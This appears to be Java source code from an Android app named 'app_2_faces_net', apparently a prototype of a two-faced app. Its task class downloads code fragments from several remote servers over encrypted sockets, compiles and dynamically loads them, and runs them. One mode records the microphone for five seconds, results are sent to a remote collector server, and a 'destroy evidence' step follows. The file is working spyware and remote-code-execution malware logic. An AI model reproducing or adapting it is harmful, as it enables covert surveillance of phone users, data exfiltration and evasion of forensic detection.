package com.android.app_2_faces_net;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.util.Log;

import com.android.app_2_faces_net.compile_unit.Compiler;
import com.android.app_2_faces_net.compile_unit.InvalidSourceCodeException;
import com.android.app_2_faces_net.compile_unit.NotBalancedParenthesisException;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.regex.Pattern;

import javassist.NotFoundException;

class CompilationTask extends AsyncTask<String, Void, String> {
    private static final String TAG = "CompilationTask";

    private final Context context;

    private final String socketCollectorHostname;
    private final int socketCollectorPort;

    private CryptedSocket socketCollector;

    private final HashMap<Integer, String> pieces;

    public CompilationTask(Context context, String socketCollectorHostname, int socketCollectorPort) {
        this.context = context;
        this.pieces = new HashMap<>();

        this.socketCollectorHostname = socketCollectorHostname;
        this.socketCollectorPort = socketCollectorPort;
    }

    @Override
    protected String doInBackground(String... args) {
        String servers = args[0];
        String resultType = args[2];
        String arg = args[3];

        String[] socketCodeSendersList = parseSocketCodeSenderList(servers);
        Log.d("serversList", Arrays.toString(socketCodeSendersList));

        resultType = resultType.split("Result Type: ")[1];
        arg = arg.split("Arg: ")[1];

        try {
            //download phase
            long startDownloadPhase = System.nanoTime();
            this.pieces.clear();
            for (int i = 0; i < socketCodeSendersList.length; i++) {
                String[] codeSenderParams = socketCodeSendersList[i].split(":");

                DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]));
                task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, i);
            }

            while (this.pieces.size() < socketCodeSendersList.length) {
                Thread.sleep(100);
            }
            StringBuilder codeBuilder = new StringBuilder();
            for (int i = 0; i < socketCodeSendersList.length; i++) {
                codeBuilder.append(this.pieces.get(i));
            }
            String code = codeBuilder.toString();
            long endDownloadPhase = System.nanoTime();
            //end download phase


            //new Compile instance
            Compiler compiler = new Compiler(this.context, code, this.context.getFilesDir());

            //parsing phase
            long startParsing = System.nanoTime();
            compiler.parseSourceCode();
            long endParsing = System.nanoTime();
            //end parsing phase

            //compiling phase
            long startCompiling = System.nanoTime();
            compiler.compile();
            long endCompiling = System.nanoTime();
            //end compiling phase

            //dynamic loading phase
            long startLoading = System.nanoTime();
            compiler.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
            long endLoading = System.nanoTime();
            //end dynamic loading phase

            //execution phase
            long startExecution = System.nanoTime();
            Object obj = compiler.getInstance("RuntimeClass");
            String result;
            if (resultType.equals("Sound")) {
                Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
                MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);

                Thread.sleep(5000);

                Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
                result = (String) secondMethod.invoke(obj, recorder, this.context);
            } else {
                Method method = obj.getClass().getDeclaredMethod("run", Context.class);
                result = (String) method.invoke(obj, this.context);
            }
            long endExecution = System.nanoTime();
            String resultToSend = "Result: " + result;
            //end execution phase

            //eval timing
            double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
            double timeToParse = (endParsing - startParsing) / 1000000.0;
            double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
            double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
            double timeToExecute = (endExecution - startExecution) / 1000000.0;
            String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;

            //collector phase
            this.socketCollector = new CryptedSocket(this.socketCollectorHostname, this.socketCollectorPort);
            this.socketCollector.connect();
            this.socketCollector.write(timingToSend + "|" + resultToSend);
            this.socketCollector.close();

            //destroy evidence
            compiler.destroyEvidence();
        } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InterruptedException | InvalidSourceCodeException | IOException e) {
            e.printStackTrace();
            this.socketCollector.close();
        }
        this.socketCollector.close();
        return "ok";
    }

    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
    }

    /** **/
    class DownloadTask extends AsyncTask<Integer, Void, String> {
        private static final String TAG = "DownloadTask";

        private CryptedSocket socketCodeSender;

        private final String socketCodeSenderHostname;
        private final int socketCodeSenderPort;

        public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort) {
            this.socketCodeSenderHostname = socketCodeSenderHostname;
            this.socketCodeSenderPort = socketCodeSenderPort;
        }

        @Override
        protected String doInBackground(Integer... integer) {
            try {
                Log.d(TAG, "Starting downloadTask...");

                this.socketCodeSender = new CryptedSocket(this.socketCodeSenderHostname, this.socketCodeSenderPort);

                this.socketCodeSender.connect();


                String piece = this.socketCodeSender.read();
                pieces.put(integer[0], piece);

                this.socketCodeSender.close();
            } catch (IOException e) {
                e.printStackTrace();
                this.socketCodeSender.close();
            }
            this.socketCodeSender.close();
            return "Done";
        }

        @Override
        protected void onPostExecute(String s) {
            Log.d(TAG, "[Downloaded from SocketCodeSender...]");
        }
    }
}